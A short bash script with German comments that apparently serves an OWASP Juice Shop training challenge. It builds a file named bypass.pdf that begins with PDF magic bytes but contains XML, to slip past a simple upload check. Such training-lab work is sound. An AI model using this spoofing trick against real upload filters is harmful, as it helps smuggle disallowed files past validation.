#!/bin/bash
# OWASP Juice Shop - PDF Upload Bypass
# Methode: Magic Bytes Spoofing
# 
# Beschreibung:
# Dieses Script erstellt eine Datei, die PDF Magic Bytes enthält,
# aber eigentlich XML-Inhalt hat. Dies umgeht einfache PDF-Validierungen.

echo "🔨 Erstelle Fake PDF mit XML-Inhalt..."
echo -e '%PDF-1.4\n<?xml version="1.0"?><root>bypass</root>' > bypass.pdf
echo "✅ Datei 'bypass.pdf' wurde erstellt!"
echo "📁 Die Datei enthält PDF Magic Bytes aber ist eigentlich XML"